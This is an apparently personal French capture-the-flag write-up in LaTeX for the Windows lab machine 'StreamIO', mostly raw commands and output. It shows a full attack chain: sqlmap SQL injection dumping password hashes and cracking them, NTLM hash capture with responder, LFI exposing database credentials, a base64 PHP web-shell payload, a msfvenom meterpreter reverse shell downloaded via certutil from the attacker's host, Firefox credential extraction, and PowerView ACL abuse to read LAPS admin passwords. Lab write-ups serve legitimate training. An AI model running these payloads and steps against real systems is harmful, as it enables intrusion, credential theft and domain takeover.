\chapter{StreamIO [Windows:Medium]}
\begin{itemize}
    \item {\bf keywords}: web, mozilla creds

    \item {\bf Components}: \gls{mssql}, \gls{iis}, \gls{php}, \gls{mozilla}

    \item {\bf tools}: sqlmap, ffuf, responder, hashcat,
        hashid,msfvenom,metasploit,mssqlclient.py, evil-winrm,laps,
        firepwd,powerview
\end{itemize}


\section{Résumé}

une injection SQL permet de récuperer des credentials pour se connecter à une
interface d'admin.


L'interface d'admin offre une possibilité de RCE et du LFI pour exfiltrer le
code qui contient les credential admin de la BDD.

via un revershell on setup un port forward qui permet d'acceder à la BDD.

une BDD de backup contient les cred d'un vrai user du system.

en se connectant au système l'utilisateur dispose de firefox qui divulgue des
credentials que l'on crack avec firepwd

on a un acces avec un nouvel utilisateur.

avec powerview on peut lui donner le droit d'acceder au LAPS.

avec le LAPS on accede au compte administator.




\section{Details}

\subsection{nmap}
\begin{verbatim}
sudo nmap -sV -sC 10.10.11.158
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-06 15:39 CEST
Nmap scan report for 10.10.11.158
Host is up (0.12s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-09-06 20:39:20Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn:
|_  http/1.1
|_ssl-date: 2022-09-06T20:40:12+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2022-09-06T20:39:32
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m58s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
\end{verbatim}

\subsection{dns}
\begin{verbatim}
drill @10.10.11.158 any streamio.htb
;; ANSWER SECTION:
streamio.htb.   600     IN      A       10.10.11.158
streamio.htb.   3600    IN      NS      dc.streamio.htb.
streamio.htb.   3600    IN      SOA     dc.streamio.htb. hostmaster.streamio.htb. 282 900 600 86400 3600
streamio.htb.   600     IN      AAAA    dead:beef::293a:1471:3c71:87d5
streamio.htb.   600     IN      AAAA    dead:beef::f7
\end{verbatim}


\begin{verbatim}
dnsrecon \
    -D /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt 
    -d strreamio.htb -n 10.10.11.158 -t brt
\end{verbatim}

\subsection{ldap}
\begin{verbatim}
ldapsearch -x -b "dc=streamio,dc=htb" -H ldap://dc.streamio.htb

In order to perform this opera tion a successful bind must be completed on the connection.
\end{verbatim}

\subsection{smb}

\begin{verbatim}
enum4linux-ng -A -u anonymous dc.streamio.htb
smbclient -L \\10.10.11.158 -N
Can't load /etc/samba/smb.conf - run testparm to debug it
session setup failed: NT_STATUS_ACCESS_DENIED
\end{verbatim}

pas de null session pas d'anonymous.


\subsection{http}

PHP ASP.Net

\begin{verbatim}
 dirb https://watch.streamio.htb /usr/share/wordlists/discovery/dirb/common.txt
\end{verbatim}

\begin{verbatim}
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt:FUZZ \
-u https://watch.streamio.htb/FUZZ

ffuf -u https://watch.streamio.htb/FUZZ \
    -w
    /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ \
    -e .php

search.php
blocked.php
index.php
\end{verbatim}

\begin{verbatim}
sqlmap -u https://watch.streamio.htb/search.php --data "q=test" --batch
\end{verbatim}
rien

\begin{verbatim}
ffuf -u https://watch.streamio.htb/search.php \
    -d "FUZZ=test" \
    -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ 
    -fs 253887
\end{verbatim}
rien

\begin{verbatim}
 ffuf -u "https://watch.streamio.htb/index.php?FUZZ=test"  \
    -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -fs 2829
\end{verbatim}
rien

\begin{verbatim}
https://streamio.htb/login.php
\end{verbatim}


\subsection{MSSQL using sqli}

\begin{verbatim}
sqlmap  --batch -u 'https://streamio.htb/login.php' \
    --data 'username=test&password=test'

sqlmap identified the following injection point(s) with a total of 64 HTTP(s) requests:
---
Parameter: username (POST)
    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: username=test';WAITFOR DELAY '0:0:5'--&password=test
---

 the back-end DBMS is Microsoft SQL Server
\end{verbatim}

\begin{verbatim}
sudo responder -I tun0 -A

sqlmap ...  --sql-query="exec master.dbo.xp_dirtree '\\\\10.10.16.3\\share'"

[SMB] NTLMv2-SSP Client   : 10.10.11.158
[SMB] NTLMv2-SSP Username : streamIO\DC$
[SMB] NTLMv2-SSP Hash     : DC$::streamIO:d4d1530d4e6a1e18:FD555CDF60E718A6425ABF4096A136F3:010100000000000000D062C0B5C2D8016B5F1CF5CF3F42810000000002000800470046005000550001001E00570049004E002D0034005A003300460037004B004A004A0054004E00440004003400570049004E002D0034005A003300460037004B004A004A0054004E0044002E0047004600500055002E004C004F00430041004C000300140047004600500055002E004C004F00430041004C000500140047004600500055002E004C004F00430041004C000700080000D062C0B5C2D80106000400020000000800300030000000000000000000000000300000DCFEC8CB7C4C4BA9E7048E824A29C833FDE7656DCD616C6D44873B0E244236FD0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0033000000000000000000
\end{verbatim}


\begin{verbatim}
sqlmap --batch  -u 'https://streamio.htb/login.php'  \
    --data 'username=test&password=test' --dbms="Microsoft SQL Server" \
    --os-shell

[12:47:30] [WARNING] xp_cmdshell creation failed, probably because sp_OACreate is disabled
[12:47:30] [CRITICAL] unable to proceed without xp_cmdshell
\end{verbatim}




\begin{verbatim}
sqlmap XXX --dbms="Microsoft SQL Server" --current-db
    current database: 'STREAMIO'

XXX --dbms="hhMicrosoft SQL Server" --schema
    [05:05:19] [INFO] retrieved: msdb
    [05:06:03] [INFO] retrieved: STREAMIO
    [05:07:30] [INFO] retrieved: streamio_backup


XXX --dbms="Microsoft SQL Server" -D STREAMIO --tables
[2 tables]
+--------+
| movies |
| users  |
+--------+

XXX --dbms="Microsoft SQL Server" -D STREAMIO -T users --columns
+----------+-------+
| Column   | Type  |
+----------+-------+
| id       | int   |
| is_staff | bit   |
| password | nchar |
| username | nchar |
+----------+-------+


XXX --dbms="Microsoft SQL Server" -D STREAMIO -T users --count

+-----------+---------+
| Table     | Entries |
+-----------+---------+
| dbo.users | 30      |
+-----------+---------+


-C username --dump ---where="is_staff = 1'
RIEN

#column password pose un soucis
-C username,password,is_staff --dump
+----+----------+----------------------------------------------------+----------------------------------------------------+
| id | is_staff | password                                           | username                                           |
+----+----------+----------------------------------------------------+----------------------------------------------------+
| 3  | 1        | c660060492d9edcaa8332d89c99c9239                   | James                                              |
| 31 | 1        | b779ba15cedfd22a023c4d8bcf5f2332                   | yoshihide                                          |
| 33 | 0        | 665a50ac9eaa781e4f7f04199db97a11                   | admin                                              |
+----+----------+----------------------------------------------------+----------------------------------------------------+
\end{verbatim}

\begin{verbatim}
hashid b779ba15cedfd22a023c4d8bcf5f2332 
hashcat -m 0 passwds.txt rockyou.txt

admin : paddpadd
yoshihide : 66boysandgirls..
\end{verbatim}


\begin{verbatim}
sqlmap --dump --batch  -u 'https://streamio.htb/login.php'  \
    --data 'username=test&password=test' --dbms="Microsoft SQL Server" \
    -D master -T "sys.server_principals" --columns

sqlmap --dump --batch  -u 'https://streamio.htb/login.php'  \
    --data 'username=test&password=test' --dbms="Microsoft SQL Server" \
    -D master -T "sys.server_principals"  -C name,password_hash, type_desc
+---------------+---------------+
| name          | password_hash |
+---------------+---------------+
| sa            | <blank>       |
| public        | <blank>       |
| sysadmin      | <blank>       |
| securityadmin | <blank>       |
| serveradmin   | <blank>       |
| setupadmin    | <blank>       |
| processadmin  | <blank>       |
| diskadmin     | <blank>       |
| dbcreator     | <blank>       |
| bulkadmin     | <blank>       |
| db_user       | <blank>       |
+---------------+---------------+

sqlmap --dump --batch  -u 'https://streamio.htb/login.php'  \
    --data 'username=test&password=test' --dbms="Microsoft SQL Server" \
    -D master -T "sys.sql_logins"  -C name,password_hash, type_desc
+---------+---------------+
| name    | password_hash |
+---------+---------------+
| sa      | NULL          |
| db_user | NULL          |
+---------+---------------+
\end{verbatim}

\begin{verbatim}
sqlmap --batch  -u 'https://streamio.htb/login.php'  \
    --data 'username=test&password=test' --dbms="Microsoft SQL Server" \
    --users

database management system users [1]:
[*] sa


sqlmap --batch  -u 'https://streamio.htb/login.php'  \
    --data 'username=test&password=test' --dbms="Microsoft SQL Server" \
    --passwords

database management system users password hashes:
[*] sa [1]:
    password hash: NULL

\end{verbatim}

\subsection{back to http}

rien de particulier a voir


\begin{verbatim}
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt:FUZZ \
    -u https://streamio.htb/FUZZ

ADMIN                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 83ms]
Admin                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 103ms]
..
index.php               [Status: 200, Size: 13497, Words: 5027, Lines: 395, Duration: 131ms]


ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt:FUZZ \
-u "https://streamio.htb/admin/FUZZ.php" \
    -k \
    -b "PHPSESSID=5886gh38mtpkj5tc5ga13osq9c"
Index                   [Status: 200, Size: 1678, Words: 85, Lines: 50, Duration: 91ms]
index                   [Status: 200, Size: 1678, Words: 85, Lines: 50, Duration: 93ms]
master                  [Status: 200, Size: 58, Words: 5, Lines: 2, Duration: 85ms]
\end{verbatim}

\begin{verbatim}
ffuf -w burp-parameter-names.txt:FUZZ 
    -u 'https://streamio.htb/admin/index.php?FUZZ=' \
    -k \
    -b "PHPSESSID=5886gh38mtpkj5tc5ga13osq9c" \
    -fs 1678
debug                   [Status: 200, Size: 1712, Words: 90, Lines: 50, Duration: 86ms]
movie                   [Status: 200, Size: 320235, Words: 15986, Lines: 10791, Duration: 129ms]
staff                   [Status: 200, Size: 12484, Words: 1784, Lines: 399, Duration: 185ms]
user                    [Status: 200, Size: 2073, Words: 146, Lines: 63, Duration: 96ms]
\end{verbatim}



\begin{verbatim}
curl \
    "https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=index.php"\
    -k \
    -b "PHPSESSID=5886gh38mtpkj5tc5ga13osq9c"

cat index.b64 | base64 -d

<?php
define('included',true);
session_start();
if(!isset($_SESSION['admin']))
{
        header('HTTP/1.1 403 Forbidden');
        die("<h1>FORBIDDEN</h1>");
}
$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
$handle = sqlsrv_connect('(local)',$connection);
\end{verbatim}

db\_admin : B1@hx31234567890

\begin{verbatim}
curl
"https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php"\
-k \
-b "PHPSESSID=5886gh38mtpkj5tc5ga13osq9c"

cat master.b64 | base64 -d
<h1>Movie managment</h1>
<?php
if(!defined('included'))
die("Only accessable through includes");
...
...
...
?>
<br><hr><br>
<form method="POST">
<input name="include" hidden>
</form>
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" )
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
\end{verbatim}

donc il faut que le fichier soit inclus on peut le tester avec 
\verb+https://streamio.htb/admin/index.php?debug=master.php+
puis on peut lui fournir une commande

Il semble que passer une url vers un fichier hosté ne marche pas par contre
inline
\begin{verbatim}
echo -n "system(\$_GET['cmd']);" | base64
\end{verbatim}



\begin{verbatim}
curl -k -X POST -b "PHPSESSID=5886gh38mtpkj5tc5ga13osq9c" 
    --data-binary "include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7"\
    'https://streamio.htb/admin/?debug=master.php&cmd=whoami'

streamio\yoshihide
cmd=dir
C:\inetpub\streamio.htb\admin

cmd=dir+\users\
\end{verbatim}

le reste ne donne rien. On va quand même ouvrir un reverseshell.

on craft un meterpreter que l'on va heberger.

la commande powershell sera un onliner telechargeant + exec

\begin{verbatim}
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.16.3 LPORT=4444 -f exe > shell.exe

curl -k -X POST -b "PHPSESSID=5886gh38mtpkj5tc5ga13osq9c" --data-binary "include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7" "https:/streamio.htb/admin/?debug=master.php&cmd=certutil.exe++-urlcache+-split+-f+http://10.10.16.3/shell.exe+shell.exe"

msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp
payload => windows/x64/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.16.3
LHOST => 10.10.16.3
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444

\end{verbatim}
\begin{verbatim}
 mssqlclient.py db_admin:"B1@hx31234567890"@127.0.0.1 -p 8888 -db streamio_backup
 select * from users
\end{verbatim}

\begin{verbatim}
 1   nikk37                     389d14cb8e4e9b94b137deb1caf0612a


 hashcat -m 0 nikk37.txt  rockyou.txt

 get_dem_girls2@yahoo.com

\end{verbatim}

\begin{verbatim}
evil-winrm -i streamio.htb -u streamIO.htb\\nikk37 -p 'get_dem_girls2@yahoo.com'
\end{verbatim}

privesc

\begin{verbatim}
C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\
\begin{verbatim}


\begin{verbatim}
ls -Path 'c:\' -Include root.txt -Recurse -ErrorAction Ignore

https://raw.githubusercontent.com/lclevy/firepwd/master/firepwd.py


'admin''JDg0dd1s@d0p3cr3@t0r'
'nikk37''n1kk1sd0p3t00:)'
'yoshihide''paddpadd@12'
'JDgodd''password@12'

We can access JDgodd’s account using the password (winrm doesn’t work with this though):
JDg0dd1s@d0p3cr3@t0r

We can use powerview to leverage JDgodd’s user further:
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1

Using powerview, we can upgrade our new user (jdgodd) to gain access to LAPS,
the “core staff” has access to this:

$SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('streamio\JDgodd', $SecPassword)

Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Core Staff" -principalidentity "streamio\JDgodd"

Add-DomainGroupMember -identity "Core Staff" -members "streamio\JDgodd" -credential $Cred

We can then use LAPS Dumper to grab the LAPS password:

https://raw.githubusercontent.com/n00py/LAPSDumper/main/laps.py

We run this with:

python3 laps.py -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r'
-d streamio.htb

\end{verbatim}



\section{Theorie}


